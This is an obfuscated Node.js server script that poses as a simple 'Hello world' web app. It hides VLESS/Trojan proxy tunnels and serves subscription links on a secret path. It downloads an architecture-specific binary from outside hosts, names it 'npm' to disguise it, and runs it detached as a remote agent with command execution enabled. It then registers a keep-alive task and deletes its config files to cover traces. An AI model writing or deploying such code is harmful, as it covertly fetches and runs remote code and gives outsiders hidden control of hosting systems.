const _0x3d4b05=_0x265f;(function(_0x5d2d5a,_0x105e57){const _0x3d2b31=_0x265f,_0x4c948b=_0x5d2d5a();while(!![]){try{const _0xd9d07=parseInt(_0x3d2b31(0x1a0))/0x1+parseInt(_0x3d2b31(0x1ad))/0x2+parseInt(_0x3d2b31(0x1a8))/0x3+parseInt(_0x3d2b31(0x16c))/0x4+parseInt(_0x3d2b31(0x1a3))/0x5+parseInt(_0x3d2b31(0x19a))/0x6*(-parseInt(_0x3d2b31(0x17f))/0x7)+parseInt(_0x3d2b31(0x1ce))/0x8*(-parseInt(_0x3d2b31(0x1c2))/0x9);if(_0xd9d07===_0x105e57)break;else _0x4c948b['push'](_0x4c948b['shift']());}catch(_0x228a78){_0x4c948b['push'](_0x4c948b['shift']());}}}(_0x22bd,0x3924e));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x3d4b05(0x17a)),net=require(_0x3d4b05(0x1ca)),path=require('path'),crypto=require(_0x3d4b05(0x1c6)),{Buffer}=require(_0x3d4b05(0x174)),{exec,execSync}=require(_0x3d4b05(0x1a2)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3d4b05(0x169)][_0x3d4b05(0x17c)]||'5efabea4-f6d4-91fd-b8f0-17e004c89c60',NEZHA_SERVER=process[_0x3d4b05(0x169)][_0x3d4b05(0x168)]||_0x3d4b05(0x1c0),NEZHA_PORT=process[_0x3d4b05(0x169)][_0x3d4b05(0x1dc)]||'8443',NEZHA_KEY=process['env'][_0x3d4b05(0x1af)]||'',DOMAIN=process[_0x3d4b05(0x169)]['DOMAIN']||_0x3d4b05(0x1cc),AUTO_ACCESS=process[_0x3d4b05(0x169)]['AUTO_ACCESS']||!![],WSPATH=process[_0x3d4b05(0x169)][_0x3d4b05(0x1da)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x3d4b05(0x169)]['SUB_PATH']||_0x3d4b05(0x180),NAME=process['env'][_0x3d4b05(0x1cf)]||'',PORT=process[_0x3d4b05(0x169)][_0x3d4b05(0x1b4)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x4fc0c9=_0x3d4b05;try{const _0x208e08=await axios[_0x4fc0c9(0x1bb)]('https://api.ip.sb/geoip'),_0x304a3f=_0x208e08[_0x4fc0c9(0x162)];ISP=(_0x304a3f[_0x4fc0c9(0x15e)]+'-'+_0x304a3f[_0x4fc0c9(0x197)])[_0x4fc0c9(0x19c)](/ /g,'_');}catch(_0x30ac79){ISP=_0x4fc0c9(0x1ac);}};GetISP();function _0x265f(_0xffead2,_0x52ee66){_0xffead2=_0xffead2-0x15c;const _0x22bd8c=_0x22bd();let _0x265f18=_0x22bd8c[_0xffead2];return _0x265f18;}const httpServer=http[_0x3d4b05(0x16f)]((_0xcf7324,_0x4b2f61)=>{const _0x5633a5=_0x3d4b05;if(_0xcf7324[_0x5633a5(0x195)]==='/'){const _0x3cd74b=path['join'](__dirname,_0x5633a5(0x186));fs[_0x5633a5(0x18b)](_0x3cd74b,'utf8',(_0x4bc199,_0x4a0dc3)=>{const _0x212e35=_0x5633a5;if(_0x4bc199){_0x4b2f61[_0x212e35(0x1cd)](0xc8,{'Content-Type':_0x212e35(0x1b9)}),_0x4b2f61[_0x212e35(0x176)]('Hello\x20world!');return;}_0x4b2f61[_0x212e35(0x1cd)](0xc8,{'Content-Type':_0x212e35(0x1b9)}),_0x4b2f61[_0x212e35(0x176)](_0x4a0dc3);});return;}else{if(_0xcf7324[_0x5633a5(0x195)]==='/'+SUB_PATH){const _0x57595d=NAME?NAME+'-'+ISP:ISP,_0x29d42f=_0x5633a5(0x19d)+UUID+'@'+DOMAIN+_0x5633a5(0x1a6)+DOMAIN+_0x5633a5(0x175)+DOMAIN+_0x5633a5(0x16d)+WSPATH+'#'+_0x57595d,_0x4519eb=_0x5633a5(0x187)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x5633a5(0x175)+DOMAIN+_0x5633a5(0x16d)+WSPATH+'#'+_0x57595d,_0x5e2abd=_0x29d42f+'\x0a'+_0x4519eb,_0x1e59e4=Buffer[_0x5633a5(0x1d1)](_0x5e2abd)['toString'](_0x5633a5(0x1b0));_0x4b2f61[_0x5633a5(0x1cd)](0xc8,{'Content-Type':_0x5633a5(0x170)}),_0x4b2f61['end'](_0x1e59e4+'\x0a');}else _0x4b2f61[_0x5633a5(0x1cd)](0x194,{'Content-Type':'text/plain'}),_0x4b2f61['end'](_0x5633a5(0x1a4));}}),wss=new WebSocket[(_0x3d4b05(0x1b6))]({'server':httpServer}),uuid=UUID[_0x3d4b05(0x19c)](/-/g,''),DNS_SERVERS=[_0x3d4b05(0x18c),'1.1.1.1'];function resolveHost(_0x505c2e){return new Promise((_0x1216c9,_0x3e4b8a)=>{const _0x3bc101=_0x265f;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3bc101(0x173)](_0x505c2e)){_0x1216c9(_0x505c2e);return;}let _0x50e19c=0x0;function _0x18685d(){const _0x1866a2=_0x3bc101;if(_0x50e19c>=DNS_SERVERS['length']){_0x3e4b8a(new Error(_0x1866a2(0x1d3)+_0x505c2e+_0x1866a2(0x1bf)));return;}const _0x17ac51=DNS_SERVERS[_0x50e19c];_0x50e19c++;const _0x114eeb=_0x1866a2(0x182)+encodeURIComponent(_0x505c2e)+_0x1866a2(0x184);axios['get'](_0x114eeb,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x1866a2(0x1c5)](_0x16f399=>{const _0x31c445=_0x1866a2,_0x565804=_0x16f399['data'];if(_0x565804[_0x31c445(0x15c)]===0x0&&_0x565804[_0x31c445(0x1db)]&&_0x565804[_0x31c445(0x1db)][_0x31c445(0x1c3)]>0x0){const _0x36bd73=_0x565804[_0x31c445(0x1db)][_0x31c445(0x164)](_0x5ceddc=>_0x5ceddc['type']===0x1);if(_0x36bd73){_0x1216c9(_0x36bd73[_0x31c445(0x162)]);return;}}_0x18685d();})[_0x1866a2(0x1bd)](_0x1739f2=>{_0x18685d();});}_0x18685d();});}function handleVlessConnection(_0x33f999,_0x5839d7){const _0x266ee5=_0x3d4b05,[_0x20bc21]=_0x5839d7,_0x38beb2=_0x5839d7[_0x266ee5(0x1d9)](0x1,0x11);if(!_0x38beb2[_0x266ee5(0x199)]((_0x5cd9dc,_0x46abf1)=>_0x5cd9dc==parseInt(uuid[_0x266ee5(0x18e)](_0x46abf1*0x2,0x2),0x10)))return![];let _0x336023=_0x5839d7[_0x266ee5(0x1d9)](0x11,0x12)[_0x266ee5(0x1bc)]()+0x13;const _0x568edd=_0x5839d7[_0x266ee5(0x1d9)](_0x336023,_0x336023+=0x2)['readUInt16BE'](0x0),_0xabdf8c=_0x5839d7['slice'](_0x336023,_0x336023+=0x1)['readUInt8'](),_0x5f3c85=_0xabdf8c==0x1?_0x5839d7[_0x266ee5(0x1d9)](_0x336023,_0x336023+=0x4)[_0x266ee5(0x19b)]('.'):_0xabdf8c==0x2?new TextDecoder()[_0x266ee5(0x1c4)](_0x5839d7[_0x266ee5(0x1d9)](_0x336023+0x1,_0x336023+=0x1+_0x5839d7[_0x266ee5(0x1d9)](_0x336023,_0x336023+0x1)['readUInt8']())):_0xabdf8c==0x3?_0x5839d7['slice'](_0x336023,_0x336023+=0x10)[_0x266ee5(0x1d4)]((_0x584644,_0x1c3fd7,_0x572840,_0xbfded8)=>_0x572840%0x2?_0x584644[_0x266ee5(0x193)](_0xbfded8[_0x266ee5(0x1d9)](_0x572840-0x1,_0x572840+0x1)):_0x584644,[])['map'](_0x321f99=>_0x321f99[_0x266ee5(0x179)](0x0)['toString'](0x10))[_0x266ee5(0x19b)](':'):'';_0x33f999['send'](new Uint8Array([_0x20bc21,0x0]));const _0x329166=createWebSocketStream(_0x33f999);return resolveHost(_0x5f3c85)[_0x266ee5(0x1c5)](_0x2f9080=>{const _0x3d9b7f=_0x266ee5;net[_0x3d9b7f(0x1d8)]({'host':_0x2f9080,'port':_0x568edd},function(){const _0x5b1900=_0x3d9b7f;this[_0x5b1900(0x198)](_0x5839d7['slice'](_0x336023)),_0x329166['on']('error',()=>{})[_0x5b1900(0x188)](this)['on'](_0x5b1900(0x177),()=>{})[_0x5b1900(0x188)](_0x329166);})['on'](_0x3d9b7f(0x177),()=>{});})[_0x266ee5(0x1bd)](_0xd722b8=>{const _0x4b6e6c=_0x266ee5;net['connect']({'host':_0x5f3c85,'port':_0x568edd},function(){const _0x989fc=_0x265f;this[_0x989fc(0x198)](_0x5839d7[_0x989fc(0x1d9)](_0x336023)),_0x329166['on'](_0x989fc(0x177),()=>{})[_0x989fc(0x188)](this)['on'](_0x989fc(0x177),()=>{})[_0x989fc(0x188)](_0x329166);})['on'](_0x4b6e6c(0x177),()=>{});}),!![];}function handleTrojanConnection(_0x1443e3,_0x4bfed4){const _0x4a986a=_0x3d4b05;try{if(_0x4bfed4['length']<0x3a)return![];const _0x48cbbb=_0x4bfed4[_0x4a986a(0x1d9)](0x0,0x38)[_0x4a986a(0x1a1)](),_0x53cebd=[UUID];let _0x3a5f4c=null;for(const _0x18a5a0 of _0x53cebd){const _0x5a07ba=crypto[_0x4a986a(0x165)](_0x4a986a(0x16a))[_0x4a986a(0x171)](_0x18a5a0)['digest'](_0x4a986a(0x1d0));if(_0x5a07ba===_0x48cbbb){_0x3a5f4c=_0x18a5a0;break;}}if(!_0x3a5f4c)return![];let _0x1feaa6=0x38;_0x4bfed4[_0x1feaa6]===0xd&&_0x4bfed4[_0x1feaa6+0x1]===0xa&&(_0x1feaa6+=0x2);const _0x7c060e=_0x4bfed4[_0x1feaa6];if(_0x7c060e!==0x1)return![];_0x1feaa6+=0x1;const _0x4e2336=_0x4bfed4[_0x1feaa6];_0x1feaa6+=0x1;let _0x2bc0fc,_0x3f6e5c;if(_0x4e2336===0x1)_0x2bc0fc=_0x4bfed4['slice'](_0x1feaa6,_0x1feaa6+0x4)[_0x4a986a(0x19b)]('.'),_0x1feaa6+=0x4;else{if(_0x4e2336===0x3){const _0x1da223=_0x4bfed4[_0x1feaa6];_0x1feaa6+=0x1,_0x2bc0fc=_0x4bfed4[_0x4a986a(0x1d9)](_0x1feaa6,_0x1feaa6+_0x1da223)[_0x4a986a(0x1a1)](),_0x1feaa6+=_0x1da223;}else{if(_0x4e2336===0x4)_0x2bc0fc=_0x4bfed4[_0x4a986a(0x1d9)](_0x1feaa6,_0x1feaa6+0x10)[_0x4a986a(0x1d4)]((_0x23cec3,_0x2ed68a,_0x352dbc,_0x5990a3)=>_0x352dbc%0x2?_0x23cec3[_0x4a986a(0x193)](_0x5990a3['slice'](_0x352dbc-0x1,_0x352dbc+0x1)):_0x23cec3,[])[_0x4a986a(0x178)](_0x2d8c30=>_0x2d8c30[_0x4a986a(0x179)](0x0)[_0x4a986a(0x1a1)](0x10))[_0x4a986a(0x19b)](':'),_0x1feaa6+=0x10;else return![];}}_0x3f6e5c=_0x4bfed4[_0x4a986a(0x179)](_0x1feaa6),_0x1feaa6+=0x2;_0x1feaa6<_0x4bfed4[_0x4a986a(0x1c3)]&&_0x4bfed4[_0x1feaa6]===0xd&&_0x4bfed4[_0x1feaa6+0x1]===0xa&&(_0x1feaa6+=0x2);const _0x26a23d=createWebSocketStream(_0x1443e3);return resolveHost(_0x2bc0fc)['then'](_0x3437e5=>{const _0x25ef3b=_0x4a986a;net[_0x25ef3b(0x1d8)]({'host':_0x3437e5,'port':_0x3f6e5c},function(){const _0x5df146=_0x25ef3b;_0x1feaa6<_0x4bfed4[_0x5df146(0x1c3)]&&this['write'](_0x4bfed4[_0x5df146(0x1d9)](_0x1feaa6)),_0x26a23d['on'](_0x5df146(0x177),()=>{})['pipe'](this)['on'](_0x5df146(0x177),()=>{})[_0x5df146(0x188)](_0x26a23d);})['on'](_0x25ef3b(0x177),()=>{});})[_0x4a986a(0x1bd)](_0xfd2c47=>{const _0x3e4ba5=_0x4a986a;net[_0x3e4ba5(0x1d8)]({'host':_0x2bc0fc,'port':_0x3f6e5c},function(){const _0x53f28b=_0x3e4ba5;_0x1feaa6<_0x4bfed4[_0x53f28b(0x1c3)]&&this['write'](_0x4bfed4[_0x53f28b(0x1d9)](_0x1feaa6)),_0x26a23d['on'](_0x53f28b(0x177),()=>{})['pipe'](this)['on']('error',()=>{})[_0x53f28b(0x188)](_0x26a23d);})['on'](_0x3e4ba5(0x177),()=>{});}),!![];}catch(_0x1ee284){return![];}}wss['on'](_0x3d4b05(0x194),(_0x45a1b6,_0x26ab33)=>{const _0x38f7a0=_0x3d4b05,_0x216cbc=_0x26ab33[_0x38f7a0(0x195)]||'';_0x45a1b6[_0x38f7a0(0x1c9)](_0x38f7a0(0x1c7),_0xa479f3=>{const _0x2e1d43=_0x38f7a0;if(_0xa479f3[_0x2e1d43(0x1c3)]>0x11&&_0xa479f3[0x0]===0x0){const _0x51b173=_0xa479f3[_0x2e1d43(0x1d9)](0x1,0x11),_0xcc9ec6=_0x51b173[_0x2e1d43(0x199)]((_0x16dbd6,_0x5ba7aa)=>_0x16dbd6==parseInt(uuid[_0x2e1d43(0x18e)](_0x5ba7aa*0x2,0x2),0x10));if(_0xcc9ec6){!handleVlessConnection(_0x45a1b6,_0xa479f3)&&_0x45a1b6[_0x2e1d43(0x16e)]();return;}}!handleTrojanConnection(_0x45a1b6,_0xa479f3)&&_0x45a1b6[_0x2e1d43(0x16e)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x4ba40c=_0x3d4b05,_0x100a70=os[_0x4ba40c(0x19e)]();return _0x100a70===_0x4ba40c(0x1d7)||_0x100a70===_0x4ba40c(0x1a5)||_0x100a70===_0x4ba40c(0x191)?!NEZHA_PORT?_0x4ba40c(0x190):_0x4ba40c(0x1d2):!NEZHA_PORT?_0x4ba40c(0x16b):_0x4ba40c(0x18d);},downloadFile=async()=>{const _0x51b6f0=_0x3d4b05;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4d0467=getDownloadUrl(),_0x17cd14=await axios({'method':_0x51b6f0(0x1bb),'url':_0x4d0467,'responseType':_0x51b6f0(0x167)}),_0x2c4ff6=fs[_0x51b6f0(0x1dd)]('npm');return _0x17cd14[_0x51b6f0(0x162)]['pipe'](_0x2c4ff6),new Promise((_0x26988f,_0x4be3e7)=>{const _0xcfc555=_0x51b6f0;_0x2c4ff6['on'](_0xcfc555(0x196),()=>{const _0x45ee6e=_0xcfc555;console['log']('npm\x20download\x20successfully'),exec(_0x45ee6e(0x1b8),_0x34a311=>{if(_0x34a311)_0x4be3e7(_0x34a311);_0x26988f();});}),_0x2c4ff6['on'](_0xcfc555(0x177),_0x4be3e7);});}catch(_0x9dc13d){throw _0x9dc13d;}},runnz=async()=>{const _0x5a4947=_0x3d4b05;try{const _0x51432d=execSync(_0x5a4947(0x1d6),{'encoding':_0x5a4947(0x181)});if(_0x51432d[_0x5a4947(0x1b3)]()!==''){console[_0x5a4947(0x1ab)](_0x5a4947(0x18f));return;}}catch(_0xd52d92){}await downloadFile();let _0x5316f6='',_0x148b54=[_0x5a4947(0x1a9),'8443',_0x5a4947(0x1c1),_0x5a4947(0x163),_0x5a4947(0x1a7),_0x5a4947(0x1aa)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x245d21=_0x148b54[_0x5a4947(0x17d)](NEZHA_PORT)?_0x5a4947(0x1ba):'';_0x5316f6=_0x5a4947(0x17b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5a4947(0x183)+NEZHA_KEY+'\x20'+_0x245d21+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x38891f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x5a4947(0x1d5)](':')[_0x5a4947(0x166)]():'',_0xd89d10=_0x148b54[_0x5a4947(0x17d)](_0x38891f)?_0x5a4947(0x161):_0x5a4947(0x172),_0x2bfe1d=_0x5a4947(0x1b1)+NEZHA_KEY+_0x5a4947(0x15d)+NEZHA_SERVER+_0x5a4947(0x192)+_0xd89d10+_0x5a4947(0x1c8)+UUID;fs[_0x5a4947(0x1b2)]('config.yaml',_0x2bfe1d);}_0x5316f6=_0x5a4947(0x1b7);}else{console[_0x5a4947(0x1ab)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5316f6,{'shell':_0x5a4947(0x18a)},_0x3139ca=>{const _0x536f18=_0x5a4947;if(_0x3139ca)console['error'](_0x536f18(0x1be),_0x3139ca);else console[_0x536f18(0x1ab)](_0x536f18(0x189));});}catch(_0x493e41){console[_0x5a4947(0x177)](_0x5a4947(0x185)+_0x493e41);}};async function addAccessTask(){const _0x259425=_0x3d4b05;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1b514f=_0x259425(0x1ae)+DOMAIN;try{const _0x2d0b67=await axios[_0x259425(0x1cb)](_0x259425(0x15f),{'url':_0x1b514f},{'headers':{'Content-Type':'application/json'}});console[_0x259425(0x1ab)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0xe71bf6){}}const delFiles=()=>{const _0x4410f1=_0x3d4b05;fs[_0x4410f1(0x160)](_0x4410f1(0x17e),()=>{}),fs[_0x4410f1(0x160)](_0x4410f1(0x1b5),()=>{});};httpServer[_0x3d4b05(0x19f)](PORT,()=>{const _0x26c4f3=_0x3d4b05;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x26c4f3(0x1ab)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});function _0x22bd(){const _0x2c5601=['replace','vless://','arch','listen','98295TTHGpm','toString','child_process','634855scfVqw','Not\x20Found\x0a','arm64',':443?encryption=none&security=tls&sni=','2083','1021206pIxwmP','443','2053','log','Unknown','837540rZXynZ','https://','NEZHA_KEY','base64','client_secret:\x20','writeFileSync','trim','PORT','config.yaml','Server','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','chmod\x20+x\x20npm','text/html','--tls','get','readUInt8','catch','npm\x20running\x20error:','\x20with\x20all\x20DNS\x20servers','nz.ze.ip-ddns.com','2096','9kGLsjh','length','decode','then','crypto','message','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','once','net','post','giga.ze.ip-ddns.com','writeHead','5501104quLPpw','NAME','hex','from','https://arm64.ssss.nyc.mn/agent','Failed\x20to\x20resolve\x20','reduce','split','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','arm','connect','slice','WSPATH','Answer','NEZHA_PORT','createWriteStream','Status','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','country_code','https://oooo.serv00.net/add-url','unlink','true','data','2087','find','createHash','pop','stream','NEZHA_SERVER','env','sha224','https://amd64.ssss.nyc.mn/v1','377072dvBVKL','&path=%2F','close','createServer','text/plain','update','false','test','buffer','&fp=chrome&type=ws&host=','end','error','map','readUInt16BE','axios','setsid\x20nohup\x20./npm\x20-s\x20','UUID','includes','npm','14fQcNxH','ssubbb','utf-8','https://dns.google/resolve?name=','\x20-p\x20','&type=A','error:\x20','index.html','trojan://','pipe','npm\x20is\x20running','/bin/bash','readFile','8.8.4.4','https://amd64.ssss.nyc.mn/agent','substr','npm\x20is\x20already\x20running,\x20skip\x20running...','https://arm64.ssss.nyc.mn/v1','aarch64','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','concat','connection','url','finish','isp','write','every','471018JzRzby','join'];_0x22bd=function(){return _0x2c5601;};return _0x22bd();}
